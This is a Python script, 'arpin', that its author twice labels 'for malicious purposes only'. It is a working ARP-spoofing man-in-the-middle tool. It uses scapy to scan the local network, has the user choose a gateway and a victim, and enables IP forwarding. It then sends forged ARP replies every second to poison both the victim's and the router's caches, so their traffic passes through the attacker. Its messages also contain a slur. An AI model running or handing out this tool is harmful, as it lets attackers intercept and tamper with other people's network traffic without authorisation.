# arpin by Atropin
# for malicious purposes only



import imp
from tabnanny import verbose
import scapy
import getmac
import os
import sys
import re
import threading
from scapy.layers.inet import *
from scapy.layers.l2 import ARP,Ether
from scapy.all import *
from os import walk


class client:
    def __init__(self, client_MAC, client_IP):
        self.client_MAC = client_MAC
        self.client_IP = client_IP


def scan():
    print("")
    target_ip = "192.168.1.1/24"
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip) #ARP request for all clients on the network
    result = srp(packet, timeout=3, verbose=0)[0]
    global clients  #clients on network
    clients = []
    global client 
    for sent, received in result:
        c = client(received.hwsrc, received.psrc) #gets MAC and IP addresses of each client
        clients.append(c)
    i = 0
    for client in clients:
        i += 1
        print(
            f"{'['+str(i)+']':<11} {client.client_MAC:17} {client.client_IP:>20}"
        )
    print("{:12}{:10}".format("["+str(i+1)+"]", "Exit"))
    default_gateway = input("\nSelect default gateway\n")
    if int(default_gateway) == int(i+1):
        exit()
    global router_IP, router_MAC, choice
    router_IP = clients[int(default_gateway)-1].client_IP
    router_MAC = clients[int(default_gateway)-1].client_MAC
    choice = input("\nSelect client to be attacked\n")
    if int(choice) == int(i+1):
        exit()


def select_interface():
    f = []
    print("")
    for (dirpath, dirnames, filenames) in walk("/sys/class/net"):
        f.extend(dirnames)
        break
    for x in range(len(f)):
        print("["+str(x+1)+"] "+f[x])
    print("["+str(len(f)+1)+"] exit")
    global iface
    iface_num = input("\nSelect interface\n")
    if int(iface_num) == len(f)+1:
        exit()
    if int(iface_num) > len(f)+1:
        print("Retarded option detected\nQuitting...")
        exit()
    iface = f[int(iface_num)-1]


def validate():
    if os.path.isdir("/sys/class/net/"+iface) == False:
        print("\nInvalid interface. Type 'ifconfig' to list available interfaces\n")
        exit()
    else:
        pass


def createPackets():
    global to_client
    mac = getmac.get_mac_address()
    to_client = Ether(dst=clients[int(choice)-1].client_MAC, src=mac)/ARP(op="is-at",
                                                          psrc=router_IP, pdst=clients[int(choice)-1].client_IP, hwsrc=mac, hwdst=clients[int(choice)-1].client_MAC)
    global to_router
    to_router = Ether(dst=router_MAC, src=mac)/ARP(op="is-at",
                                   psrc=clients[int(choice)-1].client_IP, pdst=router_IP, hwsrc=mac,hwdst=router_MAC)


def launch():
    f = open("/proc/sys/net/ipv4/ip_forward", "w") #enable ip forwarding
    f.write("1")
    f.close()
    global t
    t = threading.Timer(1.0, launch)
    t.start()
    sendp(to_client, verbose=0)
    sendp(to_router, verbose=0)
    print("\nThe attack is running, press ENTER to stop\n")


def stop():
    f = open("/proc/sys/net/ipv4/ip_forward", "w") #disable ip forwarding
    f.write("0")
    f.close()
    input()
    print("\nThe attack has succesfully stopped!")
    t.cancel()


#--------------MAIN---------------#
print("Created by Atropin\n\nFor malicious purposes only!\n")
print("[1] Scan the network\n[2] Quit")
x = input("\n")
while True:
    if x == "1":
        select_interface()
        validate()
        scan()
        createPackets()
        launch()
        stop()
        break
    if x == "2":
        exit()
    else:
        print("Retarded option detected\nQuitting...")
        exit()
